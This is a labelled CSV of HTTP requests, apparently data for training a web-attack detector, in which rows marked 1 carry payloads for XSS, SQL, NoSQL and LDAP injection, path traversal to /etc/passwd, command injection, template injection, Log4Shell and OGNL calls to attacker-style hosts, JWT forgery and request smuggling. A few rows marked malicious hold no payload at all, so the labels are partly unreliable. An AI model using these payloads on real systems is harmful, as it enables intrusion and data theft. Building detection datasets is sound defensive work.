method,path,query,headers,body,ua,label
POST,/,,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,1
GET,<img src=x onerror=alert(1)>,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,; cat /etc/passwd,,,,,1
GET,..%252f..%252f..%252fetc%252fhosts,,,,,1
GET,/,,,,,0
POST,/cart/add,product_id=99,,,,0
GET,/,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\""/+/onmouseover=1/(f=prompt,f(1))//'>",,,,1
GET,/,,,,,0
POST,/,,,{smart_f_shell_exec('id')},,1
GET,/,,,,,0
GET,/,,,,,0
POST,/,,,"{""$where"": ""function() { return this.name == 'admin' }""}",,1
GET,/,,,,,0
GET,%0als,,,,,1
GET,/,(&(uid=admin)(|(password=*))),,,,1
POST,/team/invite,,,"{""email"": ""colleague@work.com""}",,0
POST,/,,,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}",,1
POST,/,,,"{""alg"":""RS256"",""jku"":""http://attacker.com/key.json""}",,1
GET,/,,,,,0
GET,Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
,/,,,,,0
GET,/,class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B,,,,1
GET,/,id=1&id=2,,,,1
GET,/,,,,,1
POST,/,,,"[{""query"": ""...""}, {""query"": ""...""}]",,1
GET,/,,,,,0
GET,/,,,,,0
GET,%0d%0aSet-Cookie: session=attacker,,,,,1
GET,/,,,HTTP/1.1\r\nHost: target.com\r\nContent-Length: 42\r\n,,1
GET,/,,,,,0
GET,<script>alert('XSS')</script>,,,,,1
GET,/,,,,,0
GET,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
POST,/,,,{{7*7}}{{ '7'*7 }},,1
GET,%0als,,,,,1
GET,rmi://attacker.com:1099/Exploit,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,Content-Length: 4\r\n\r\n1234,,,,,1
GET,id=1; SELECT pg_sleep(5)--,,,,,1
GET,/,,,,,0
GET,/,,,,,0
POST,/,,,"{""alg"":""none""}",,1
GET,/,,,,,0
GET,"<a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,<body onload=alert(1)>,,,,,1
GET,/,id=1'/**/OR/**/'1'='1,,,,1
GET,/,id=1'/**/OR/**/'1'='1,,,,1
GET,Host: evil.com,,,,,1
GET,/,,,,,0
GET,../../../../etc/passwd,,,,,1
GET,/,adminDeviceSpaceId=131&format=%24%7b''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(''.getClass().forName('java.lang.Runtime')).exec('curl%20d6d5bt565jrc87ck692gzsym1em9spt3e.oast.me')%7d,,,,1
GET,/,,,,,0
POST,/,,,"[{""query"": ""...""}, {""query"": ""...""}]",,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,${jndi:ldap://attacker.com/a},,,,,1
GET,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\a')))",,,,,1
GET,php://input,,,,,1
GET,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,,,1
GET,javascript:alert(1),,,,,1
GET,<body onload=alert(1)>,,,,,1
GET,/,,,,,0
GET,/,,,,,0
POST,/,,,{{7*7}} or {{config.items()}},,1
GET,id=1; DROP TABLE users--,,,,,1
GET,/,,,,,0
GET,/,,,,,0
POST,/,,,"{""name"": ""__import__('os').system('id')""}",,1
GET,/,,,,,0
GET,/,,,,,1
GET,/,__proto__[admin]=true,,,,1
GET,"<iframe src=""https://target.com"" style=""opacity:0.5""></iframe>",,,,,1
GET,/,,,,,0
GET,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,,,1
GET,; /bin/c?t /e*c/p?sswd,,,,,1
GET,/,,,,,0
GET,http://attacker.com/shell.txt,,,,,1
GET,%253cscript%253ealert(1)%253c/script%253e,,,,,1
GET,/manifest.json,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,admin*)(| (password=*)),,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
